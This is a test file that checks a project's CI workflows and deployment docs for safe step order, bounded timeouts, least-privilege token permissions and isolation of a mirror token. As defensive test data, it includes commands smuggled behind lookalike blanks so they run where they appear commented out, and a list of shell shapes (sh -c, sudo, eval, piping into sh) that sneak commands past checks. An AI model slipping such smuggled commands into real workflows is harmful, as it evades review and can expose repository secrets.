    expect(built?.['working-directory']).toBeDefined();
    expect(dirOf(upload.with?.path)).toBe(`${built?.['working-directory']}/dist`);
    expect(upload.with?.['if-no-files-found']).toBe('error');
    // The same artifact and the same directory in the three places, and the download runs first.
    expect(download.with?.name).toBe(upload.with?.name);
    expect(dirOf(download.with?.path)).toBe(dirOf(upload.with?.path));
    expect(dirOf(pypi.with?.['packages-dir'])).toBe(dirOf(download.with?.path));
    expect([publish.needs ?? []].flat()).toContain('build');
    expect(indexOfUses(publish, 'actions/download-artifact')).toBeLessThan(
      indexOfUses(publish, 'pypa/gh-action-pypi-publish'),
    );
  });
});

/**
 * The operator-facing text around the entrypoint, the probes and the backup scripts states what they
 * do. Each of these was once true of an earlier version and outlived the change that made it false.
 */
describe('deployment docs describe what the entrypoint, probes and backup scripts do', () => {
  const root = path.join(__dirname, '..', '..');
  const read = (file: string): string => fs.readFileSync(path.join(root, file), 'utf8');

  // A non-root start leaves before the re-own, so there a host chown is the fix, not a no-op.
  it('scopes "a host chown is not a fix" to the root start', () => {
    const bullet = read('docs/12-troubleshooting-faq.md')
      .split('\n')
      .find(line => line.includes('of the host directory is not a fix'));
    expect(bullet).toMatch(/root start/);
  });

  // A non-root start never re-owns what the restore writes, and a root helper pod is refused in a
  // namespace enforcing Pod Security "restricted". The helper runs as the app user, so both hold.
  it('runs the Helm restore helper as the app user, and scopes the compose re-own to the root start', () => {
    const doc = read('docs/11-operational-runbooks.md');
    const helper = doc.slice(
      doc.indexOf('  name: openwa-restore'),
      doc.indexOf('> EOF', doc.indexOf('  name: openwa-restore')),
    );
    expect(helper).toMatch(/runAsNonRoot: true/);
    expect(helper).toMatch(/runAsUser: 997/);
    expect(helper).toMatch(/fsGroup: 997/);
    expect(helper).toMatch(/seccompProfile: \{ type: RuntimeDefault \}/);
    expect(helper).toMatch(/allowPrivilegeEscalation: false/);
    expect(helper).toMatch(/capabilities: \{ drop: \[ALL\] \}/);
    const handBack = doc
      .replace(/\n> # /g, ' ')
      .split(/[.;] /)
      .find(sentence => sentence.includes('hands the restored files back'));
    expect(handBack).toMatch(/root start/);
  });

  // Session auto-start is detached: boot does not wait for it, so no probe covers it.
  it('does not claim the startupProbe covers session restore', () => {
    expect(read('docs/13-horizontal-scaling.md')).not.toMatch(/off during boot \([^)]*session/);
    expect(read('scripts/check-chart-behaviour.mjs')).not.toMatch(/sessions to restore/);
  });

  // The chart's liveness budget lives in statefulset.yaml; a copied figure goes stale.
  it('does not restate the chart liveness budget in session comments', () => {
    for (const file of ['src/modules/session/session.service.ts', 'src/modules/session/session.service.spec.ts']) {
      expect(read(file)).not.toMatch(/the chart's (?:budget )?is ~\d+s/);
    }
  });

  // The startupProbe suspends liveness until it first succeeds, so a closed port at boot meets it, not liveness.
  it('names the startupProbe as the budget a closed port at boot runs against', () => {
    for (const file of ['src/modules/session/session.service.ts', 'src/modules/session/session.service.spec.ts']) {
      const text = read(file).replace(/\n\s*\/\/ ?/g, ' ');
      expect(text).not.toMatch(/every liveness\s+probe/i);
      expect(text).not.toMatch(/the chart's liveness budget/);
      expect(text).toMatch(/the chart's startupProbe budget/);
    }
  });

  // The note is written for any archive holding engine state, including one taken with sessions stopped.
  it('words the ENGINE-STATE-NOTE as a possibility in the restore.sh header', () => {
    const phrase = 'ENGINE-STATE-NOTE (engine auth state that may have been copied while the app ran)';
    const header = read('scripts/restore.sh')
      .split('\n')
      .filter(line => line.startsWith('#'))
      .map(line => line.replace(/^#\s*/, ''))
      .join(' ');
    expect(header).toContain(phrase);
    expect(read('docs/11-operational-runbooks.md')).toContain(phrase);
  });
});

/**
 * `ghcr.io/<repo>:main` is the channel an operator pulls to track main. Two things once decided which
 * commit it pointed at: whichever push run finished its build last, even an older commit's, and a push
 * that happened before the non-root smoke test, so an image that failed the smoke had already moved it.
 * The branch tag is now a final step that runs only after the smoke passes and only while the commit is
 * still the branch head; the build itself publishes nothing but the immutable `:<sha>` tag.
 */
describe('ci.yml moves the branch image tag only for the tested branch head', () => {
  type CiStep = Step & { if?: string; id?: string };
  type CiWorkflow = {
    concurrency?: { group?: string; 'cancel-in-progress'?: boolean | string; queue?: string };
    jobs?: Record<string, { steps?: CiStep[] }>;
  };
  const ci = (): CiWorkflow => workflowOf('ci.yml');
  const dockerSteps = (): CiStep[] => ci().jobs?.docker?.steps ?? [];

  it('finds the docker job and its steps', () => {
    expect(dockerSteps().length).toBeGreaterThan(3);
  });

  // One group per pull request, so a new push cancels the superseded run; one group per push run
  // (run_id), so pushes to main are never queued behind, or cancelled by, each other.
  it('cancels superseded pull request runs without grouping push runs together', () => {
    const concurrency = ci().concurrency;
    expect(concurrency?.['cancel-in-progress']).toBe(true);
    expect(concurrency?.group).toContain('github.event.pull_request.number');
    expect(concurrency?.group).toContain('github.run_id');
    // github.ref would put every push to main in one group, where a third push cancels the pending
    // run of the second and that commit never gets tests or an image.
    expect(concurrency?.group).not.toMatch(/github\.ref\b/);
  });

  it('never publishes the branch tag from the build step', () => {
    const tagRules = dockerSteps()
      .filter(step => (step.uses ?? '').startsWith('docker/metadata-action'))
      .map(step => String((step.with as { tags?: string } | undefined)?.tags ?? ''));
    expect(tagRules.length).toBe(1);
    expect(executableLines(tagRules.join('\n'))).not.toContain('type=ref,event=branch');
  });

  // What is wrong with the order of a docker job's steps. Two readings, because the two halves are different
  // questions: the smoke has to be a step that CERTAINLY runs the script (conservative), and every step the
  // shell MAY run `imagetools create` in has to be the last one (exact), or a re-point written as
  // `echo x<U+00A0>#; docker buildx imagetools create ...` runs ahead of the smoke while this reads green.
  const branchTagProblems = (steps: CiStep[]): string[] => {
    const last = steps.length - 1;
    const runs = (read: (run: string) => string): string[] => steps.map(step => read(step.run ?? ''));
    const smoke = runs(executableLinesConservative).findIndex(run => run.includes('smoke-test-non-root.sh'));
    const mayRepoint = runs(executableLines).flatMap((run, i) => (run.includes('imagetools create') ? [i] : []));
    const found: string[] = [];
    if (smoke === -1) found.push('no step runs the non-root smoke');
    // Last, so every check added to this job gates the branch tag, not only the non-root smoke.
    for (const i of mayRepoint) if (i !== last) found.push(`step ${i + 1} may re-point the branch tag, before the end`);
    const retag = steps[last];
    if (!executableLinesConservative(retag?.run ?? '').includes('imagetools create')) {
      found.push('the last step does not re-point the branch tag');
    } else if (smoke > -1 && smoke >= last) {
      found.push('the smoke does not run before the re-point');
    }
    if (!(retag?.if ?? '').includes("github.event_name == 'push'")) found.push('the re-point is not push only');
    const run = executableLinesConservative(retag?.run ?? '');
    if (!/git ls-remote/.test(run)) found.push('the re-point does not look up the branch head');
    if (!/GITHUB_SHA/.test(run)) found.push('the re-point does not compare the commit');
    return found;
  };

  it('re-points the branch tag as the last step, after the smoke, on push, only at the branch head', () => {
    expect(branchTagProblems(dockerSteps())).toEqual([]);
  });

  // The same checks on copies of the steps as they ship, each edited the way a change would be.
  it('refuses a re-point that runs before the smoke or is only named behind a #', () => {
    const copy = (): CiStep[] => JSON.parse(JSON.stringify(dockerSteps())) as CiStep[];
    const smokeAt = dockerSteps().findIndex(step => (step.run ?? '').includes('smoke-test-non-root.sh'));
    const REPOINT = 'docker buildx imagetools create --tag ghcr.io/x/openwa:main ghcr.io/x/openwa@sha256:0';
    const early = (run: string): CiStep[] => {
      const steps = copy();
      steps.splice(smokeAt, 0, { run });
      return steps;
    };
    // Each blank the shell reads as part of a word, and the line separator of YAML 1.1: the `#` after one is no
    // comment, so the re-point after the `;` is a command that runs before the smoke.
    for (const blank of [...BLANK_LOOKALIKES, String.fromCharCode(0x2028)]) {
      const code = `U+${blank.charCodeAt(0).toString(16)}`;
      expect([code, branchTagProblems(early(`echo x${blank}#; ${REPOINT}`))]).toEqual([
        code,
        [`step ${smokeAt + 1} may re-point the branch tag, before the end`],
      ]);
    }
    // The same line behind a space is a comment: nothing runs, so the job is as it ships.
    expect(branchTagProblems(early(`echo x # ${REPOINT}`))).toEqual([]);
    // Only the exact reading finds a re-point that is named and not run, so the last step must run it.
    const mention = copy();
    mention[mention.length - 1].run = `echo x${BLANK_LOOKALIKES[0]}# ${REPOINT}\ngit ls-remote\n$GITHUB_SHA`;
    expect(branchTagProblems(mention)).toEqual(['the last step does not re-point the branch tag']);
    // A step after the re-point, and a re-point that no longer follows the smoke.
    const appended = copy();
    appended.push({ run: 'echo done' });
    expect(branchTagProblems(appended)).toEqual([
      `step ${appended.length - 1} may re-point the branch tag, before the end`,
      'the last step does not re-point the branch tag',
      'the re-point is not push only',
      'the re-point does not look up the branch head',
      'the re-point does not compare the commit',
    ]);
    const swapped = copy();
    swapped[smokeAt].run = 'echo skipped';
    expect(branchTagProblems(swapped)).toEqual(['no step runs the non-root smoke']);
  });
});

/**
 * A job without `timeout-minutes` runs to GitHub's 360-minute default. A hung dashboard test run once
 * held its job for half an hour and still reported green, and a stalled apt mirror held another for
 * over an hour, so every job carries its own bound: a hang turns into a prompt red job instead.
 */
describe('every workflow job declares a bounded timeout', () => {
  type TimedWorkflow = { jobs?: Record<string, { 'timeout-minutes'?: unknown }> };
  const workflows = fs.readdirSync(workflowDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));
  const jobs = workflows.flatMap(file =>
    Object.entries((workflowOf(file) as TimedWorkflow).jobs ?? {}).map(([job, def]) => ({
      id: `${file}:${job}`,
      timeout: def['timeout-minutes'],
    })),
  );

  it('finds the jobs of every workflow', () => {
    expect(jobs.length).toBeGreaterThanOrEqual(30);
  });

  it('gives each job a timeout between 1 and 120 minutes', () => {
    const unbounded = jobs
      .filter(({ timeout }) => !(Number.isInteger(timeout) && (timeout as number) > 0 && (timeout as number) <= 120))
      .map(({ id, timeout }) => `${id} (${String(timeout)})`);
    expect(unbounded).toEqual([]);
  });
});

/**
 * A job that names no `permissions` of its own inherits the workflow's block, and no job-level check sees
 * that: `contents: write` or `write-all` there would hand the token to every lint, test and build job of the
 * file, and a missing block falls back to the repository default, which may be read-write. Every workflow
 * therefore holds the block at `contents: read`, and the jobs that need more name it themselves, where the
 * allow-lists and job checks see it. A workflow that is added has to be added here.
 */
describe('every workflow holds the token at contents: read for the jobs that name no permissions', () => {
  type PermissionedWorkflow = { permissions?: Record<string, string> | string | null };
  const workflows = fs.readdirSync(workflowDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));
  const HELD: Record<string, string> = { contents: 'read' };
  const NAMED = [
    'ci.yml',
    'java-sdk-release.yml',
    'js-sdk-release.yml',
    'php-sdk-release.yml',
    'python-sdk-release.yml',
    'release.yml',
    'sdk-ci.yml',
    'security-scan.yml',
    'split-php-sdk.yml',
  ];

  const grantProblems = (workflow: PermissionedWorkflow): string[] => {
    const held = workflow.permissions;
    if (held === undefined || held === null) return ['no workflow-level permissions block'];
    if (typeof held === 'string') return [`permissions: ${held}`];
    return [...new Set([...Object.keys(held), ...Object.keys(HELD)])].flatMap(scope => {
      const level = Object.hasOwn(held, scope) ? held[scope] : 'none';
      const wanted = Object.hasOwn(HELD, scope) ? HELD[scope] : 'none';
      return level === wanted ? [] : [`permission ${scope}: ${level}`];
    });
  };

  it('has every workflow of the repository named', () => {
    expect(workflows.slice().sort()).toEqual(NAMED);
  });

  it.each(NAMED)('%s: the workflow-level block is contents: read and nothing else', file => {
    expect(grantProblems(workflowOf(file) as PermissionedWorkflow)).toEqual([]);
  });

  it.each(['ci.yml', 'release.yml', 'js-sdk-release.yml'])('%s: refuses a block that grants more or none', file => {
    // `undefined` is a workflow that has no block.
    const copy = (permissions: PermissionedWorkflow['permissions']): string[] => {
      const workflow = JSON.parse(JSON.stringify(workflowOf(file))) as PermissionedWorkflow;
      if (permissions === undefined) delete workflow.permissions;
      else workflow.permissions = permissions;
      return grantProblems(workflow);
    };
    expect(copy({ contents: 'write' })).toEqual(['permission contents: write']);
    expect(copy({ contents: 'read', packages: 'write' })).toEqual(['permission packages: write']);
    expect(copy({ contents: 'read', 'id-token': 'write' })).toEqual(['permission id-token: write']);
    expect(copy('write-all')).toEqual(['permissions: write-all']);
    expect(copy('read-all')).toEqual(['permissions: read-all']);
    expect(copy(undefined)).toEqual(['no workflow-level permissions block']);
    expect(copy({})).toEqual(['permission contents: none']);
    // A scope held at none grants nothing, the same as one that is not named.
    expect(copy({ contents: 'read', packages: 'none' })).toEqual([]);
  });
});

/**
 * The dashboard's unit tests stalled for half an hour on a leaked timer and still reported green,
 * because node:test waits for the event loop to drain and nothing bounded it. The per-test timeout
 * turns that into a failure naming the file; the step timeout backstops a hang the runner cannot
 * attribute to a test.
 */
describe('the dashboard unit tests are bounded', () => {
  const dashboardScripts = (): Record<string, string> =>
    (
      JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', 'dashboard', 'package.json'), 'utf8')) as {
        scripts: Record<string, string>;
      }
    ).scripts;

  it('runs test:unit and test:cov with a per-test timeout, and test through test:unit', () => {
    const scripts = dashboardScripts();
    expect(scripts['test:unit']).toMatch(/--test-timeout=\d+/);
    expect(scripts['test:cov']).toMatch(/--test-timeout=\d+/);
    // --test-force-exit would hide the very leak the timeout exposes.
    expect(scripts['test:unit']).not.toContain('--test-force-exit');
    expect(scripts.test).toBe('npm run test:unit');
  });

  type TimedStep = Step & { 'timeout-minutes'?: unknown };
  type TimedWorkflow = { jobs?: Record<string, { steps?: TimedStep[] }> };
  // One step runs the tests, and its bound is a number. Both readings, since each half is its own question:
  // a step that certainly runs them has to be there once, and every step the shell may run them in has to
  // carry the bound, or a second one written as `echo x<U+00A0>#; npm run test:unit` runs with none.
  const unitTestProblems = (workflow: TimedWorkflow): string[] => {
    const steps = Object.values(workflow.jobs ?? {}).flatMap(job => job.steps ?? []);
    const running = (read: (run: string) => string): TimedStep[] =>
      steps.filter(step => read(step.run ?? '').includes('npm run test:unit'));
    const found: string[] = [];
    const certain = running(executableLinesConservative).length;
    if (certain !== 1) found.push(`${certain} steps certainly run the unit tests, expected 1`);
    const may = running(executableLines);
    if (may.length > 1) found.push(`${may.length} steps may run the unit tests, expected 1`);
    for (const step of may) {
      if (typeof step['timeout-minutes'] !== 'number') found.push(`a step that may run the unit tests has no bound`);
    }
    return found;
  };

  it.each(['ci.yml', 'release.yml'])('%s bounds the dashboard unit test step', file => {
    expect(unitTestProblems(workflowOf(file))).toEqual([]);
  });

  it.each(['ci.yml', 'release.yml'])('%s: refuses a second unit test run or one that is not bounded', file => {
    const copy = (): TimedWorkflow => JSON.parse(JSON.stringify(workflowOf(file))) as TimedWorkflow;
    const dashboard = (workflow: TimedWorkflow): TimedStep[] => workflow.jobs?.dashboard?.steps ?? [];
    for (const blank of [...BLANK_LOOKALIKES, String.fromCharCode(0x2028)]) {
      const code = `U+${blank.charCodeAt(0).toString(16)}`;
      const second = copy();
      dashboard(second).push({ run: `echo x${blank}#; npm run test:unit` });
      expect([code, unitTestProblems(second)]).toEqual([
        code,
        ['2 steps may run the unit tests, expected 1', 'a step that may run the unit tests has no bound'],
      ]);
    }
    // The step that runs them, with its bound taken off, and with the command only named behind a `#`.
    const unbounded = copy();
    for (const step of dashboard(unbounded)) {
      if ((step.run ?? '').includes('npm run test:unit')) delete step['timeout-minutes'];
    }
    expect(unitTestProblems(unbounded)).toEqual(['a step that may run the unit tests has no bound']);
    const named = copy();
    for (const step of dashboard(named)) {
      if ((step.run ?? '').includes('npm run test:unit')) step.run = `echo x${BLANK_LOOKALIKES[0]}# npm run test:unit`;
    }
    expect(unitTestProblems(named)).toEqual(['0 steps certainly run the unit tests, expected 1']);
  });
});

/**
 * The PHP release and the mirror workflow push to the mirror with a personal access token. The SDK's
 * tests, and the dev dependencies they run, execute in a job of their own that holds no secret, and the
 * job that pushes takes a fresh checkout, installs nothing and runs only git, with hooks switched off.
 * Each rule is read over every command position of a line and over the job's own environment, not only
 * the first word of a step: `cd sdk/php && composer install` and a token set at job level are the usual
 * shapes of the mistake.
 */
describe.each([
  ['php-sdk-release.yml', 'release'],
  ['split-php-sdk.yml', 'split'],
])('%s keeps the mirror token away from the SDK test run', (file, pusher) => {
  type PhpJob = { needs?: string | string[]; env?: unknown; steps?: Step[] };
  const jobs = (): Record<string, PhpJob> => (workflowOf(file) as unknown as { jobs: Record<string, PhpJob> }).jobs;
  // Exact unless a check is that something IS run, which passes the conservative reading.
  const runsOf = (job: PhpJob, read: (run: string) => string = executableLines): string =>
    (job.steps ?? []).map(step => read(step.run ?? '')).join('\n');
  const TOKEN = 'PHP_SDK_SPLIT_TOKEN';
  const workflowEnv = (): unknown => (workflowOf(file) as unknown as { env?: unknown }).env;
  // The whole job and the workflow's env: a token in the job's container, services or outputs counts too.
  const usesToken = (job: PhpJob): boolean => JSON.stringify([workflowEnv(), job]).includes(TOKEN);
  // Any secret but the run's own token: `secrets['X']` and `toJSON(secrets)` hand the job the mirror token as well.
  const ANY_SECRET = /\bsecrets(?:\.(?!GITHUB_TOKEN\b)|\s*\[|\s*\))/;
  const holdsSecret = (job: PhpJob): boolean => ANY_SECRET.test(JSON.stringify([workflowEnv(), job]));
  // What the job that holds the token may run: git, echo, `exit` and the shell's own words for an `if` or a
  // `case`. A wrapper (`timeout`, `sudo`), a shell (`sh -c`), an interpreter or a path puts its own word in
  // the list, so it is refused whatever it launches: this is a list of what is allowed, not of what is
  // known to be bad.
  const ALLOWED = new Set(['set', '[', '[[', 'echo', 'exit', 'fi', 'esac', 'git']);
  const FLOW = new Set(['if', 'then', 'else', 'elif', '!', '{', '}', 'case', 'in']);
  const unquote = (word: string): string => word.replace(/^[\\"'$]+|["']+$/g, '');
  // Every command of a run, at every position of a line: after `&&`, `;`, `|`, `&` or a parenthesis,
  // behind assignments and the flow words of an `if`, with a continued line joined and a redirection such as
  // `2>&1` not read as a `&`. A command substitution is a command of its own wherever it sits, quoted or
  // not; what is left of a quoted string is no command, so a `;` inside an echoed message splits nothing.
  const commands = (run: string): string[] => {
    let text = run.replace(/\\\n/g, ' ');
    const nested: string[] = [];
    for (let found = true; found;) {
      found = false;
      text = text.replace(
        /\$\(([^()]*)\)|`([^`]*)`/g,
        (_whole, parens: string | undefined, ticks: string | undefined) => {
          nested.push(parens ?? ticks ?? '');
          found = true;
          return ' ';
        },
      );
    }
    return [text, ...nested]
      .flatMap(part => part.split('\n'))
      .map(line =>
        line
          .replace(/"(?:[^"\\]|\\.)*"|'[^']*'/g, ' ')
          .replace(/\d*[<>]&\d*-?/g, ' ')
          .replace(/&>>?/g, '>')
          .replace(/^\s*[^\s()]+\)/, ' '),
      )
      .flatMap(line => line.split(/&&|\|\||[;|&()]/))
      .map(segment => {
        const words = segment.trim().split(/\s+/).filter(Boolean);
        while (words.length > 0 && (/^[A-Za-z_]\w*=/.test(words[0]) || FLOW.has(words[0]))) words.shift();
        return unquote(words[0] ?? '');
      })
      .filter(Boolean);
  };
  const refused = (run: string): string[] => commands(run).filter(word => !ALLOWED.has(word));

  it('runs the tests in a job that holds no token, and the push in a job that needs it', () => {
    const entries = Object.entries(jobs());
    const testersBy = (read: (run: string) => string): string[] =>
      entries.filter(([, job]) => /\bphpunit\b/.test(runsOf(job, read))).map(([name]) => name);
    // A job that receives any secret (`secrets['X']`, `toJSON(secrets)`) holds the mirror token as well.
    const pushers = entries.filter(([, job]) => usesToken(job) || holdsSecret(job));
    // The job runs it, and no other job may: the first needs a run that is certain, the second any text the
    // shell may run.
    expect(testersBy(executableLinesConservative)).toEqual(['test']);
    expect(testersBy(executableLines)).toEqual(['test']);
    expect(pushers.map(([name]) => name)).toEqual([pusher]);
    expect(usesToken(jobs().test)).toBe(false);
    expect(holdsSecret(jobs().test)).toBe(false);
    expect([jobs()[pusher].needs].flat()).toContain('test');
  });

  it('runs nothing but git and echo, at any command position, in the job that holds the token', () => {
    const run = runsOf(jobs()[pusher]);
    // Non-vacuity: the job does run commands, and the reader finds them.
    expect(commands(run)).toContain('git');
    expect(refused(run)).toEqual([]);
  });

  it('uses no action but the checkout in the job that holds the token', () => {
    const uses = (jobs()[pusher].steps ?? []).map(step => step.uses).filter(Boolean) as string[];
    expect(uses.length).toBeGreaterThan(0);
    expect(uses.filter(action => !/^actions\/checkout@[0-9a-f]{40}$/.test(action))).toEqual([]);
  });

  it('names core.hooksPath on the push that carries the token', () => {
    const pushesBy = (read: (run: string) => string): string[] =>
      runsOf(jobs()[pusher], read)
        .split('\n')
        .filter(line => /\bgit\b.*\bpush\b/.test(line));
    // The mirror workflow pushes with the URL on a continuation line, so the line is the `git push`.
    expect(pushesBy(executableLinesConservative).length).toBeGreaterThan(0);
    for (const line of pushesBy(executableLines)) expect(line).toContain('core.hooksPath=/dev/null');
  });

  it('refuses every shape that runs Composer, PHP or a project script, and allows what the job runs', () => {
    for (const line of [
      'cd sdk/php && composer install --no-interaction',
      'php -v',
      '(cd sdk/php; phpunit)',
      'x=1 ./vendor/bin/phpunit',
      'sudo -n composer.phar update',
      './scripts/anything.sh',
      'timeout 60 composer install',
      'timeout -s KILL 60 composer install',
      'sudo -u runner composer install',
      'sh -c "composer install"',
      'bash -lc "composer install"',
      "sh -ec 'composer install'",
      '/bin/sh -c "composer install"',
      'bash --noprofile -c "composer install"',
      'echo composer install | sh',
      'if true; then composer install; fi',
      '{ php -v; }',
      'sleep 1 & composer install',
      'eval composer install',
      '! composer install',
      '"composer" install',
      'php8.2 -v',
      'bash ./scripts/anything.sh',
      'bash "$GITHUB_WORKSPACE/scripts/x.sh"',
      'source ./scripts/x.sh',
      '. ./scripts/x.sh',
      'node sdk/javascript/scripts/smoke.mjs',
      'make -C sdk/php test',
      '$(which composer) install',
      'x=$(true)#; composer install',
      'ionice -c3 composer install',
    ]) {
      expect(refused(line)).not.toEqual([]);
    }
    for (const line of [
      'git push origin main',
      'echo "must run from a php-sdk-v* tag"',
      'echo phpstorm',
      'git -c core.hooksPath=/dev/null push',
      'SPLIT_SHA="$(git subtree split --prefix=sdk/php HEAD)"',
      'echo "Mirrored sdk/php -> rmyndharis/openwa-php@main"',
      'if git ls-remote --tags --exit-code "$MIRROR" "refs/tags/${VERSION}" >/dev/null 2>&1; then',
      'git -c core.hooksPath=/dev/null push --force \\\n  "https://x@github.com/o/r.git" \\\n  "${SHA}:refs/heads/main"',
    ]) {
      expect(refused(line)).toEqual([]);
    }
    expect(usesToken({ env: { SPLIT: `\${{ secrets.${TOKEN} }}` }, steps: [] })).toBe(true);
    expect(usesToken({ steps: [{ run: 'x', env: { SPLIT: `\${{ secrets.${TOKEN} }}` } }] })).toBe(true);
    expect(usesToken({ steps: [{ run: 'x', with: { token: `\${{ secrets.${TOKEN} }}` } }] })).toBe(true);
    expect(usesToken({ steps: [{ run: 'x' }] })).toBe(false);
    // A job that is handed every secret holds the mirror token, though its text never names it.
    expect(holdsSecret({ env: { ALL: '${{ toJSON(secrets) }}' }, steps: [{ run: 'composer install' }] })).toBe(true);
    expect(holdsSecret({ steps: [{ run: 'x', env: { T: "${{ secrets['X'] }}" } }] })).toBe(true);
    expect(holdsSecret({ steps: [{ run: 'x', env: { T: '${{ secrets.GITHUB_TOKEN }}' } }] })).toBe(false);
  });
});

/**
 * release.yml serializes every tag run in one group, so two runs never interleave the channel reads and the
 * re-points of X.Y and `latest`. GitHub keeps one pending run per group by default and cancels it when another
 * is queued, so a third tag drops the waiting release; the workflow has to say that rather than promise a queue.
 */
describe('release.yml runs one release at a time and states its pending limit', () => {
  type ReleaseWorkflow = {
    concurrency?: { group?: string; 'cancel-in-progress'?: boolean | string; queue?: string };
  };
  const release = (): ReleaseWorkflow => workflowOf('release.yml') as ReleaseWorkflow;

  it('uses one literal group and never cancels the running release', () => {
    expect(release().concurrency?.group).toBe('release');
    expect(release().concurrency?.['cancel-in-progress']).toBe(false);
  });

  it('names the one pending run the group holds, unless the group queues every run', () => {
    if (release().concurrency?.queue === 'max') return;
    const text = fs.readFileSync(path.join(workflowDir, 'release.yml'), 'utf8');
    const header = text.slice(0, text.search(/^concurrency:/m));
    expect(header).toMatch(/at most one pending run/);
    expect(header).not.toMatch(/global queue/);
  });
});
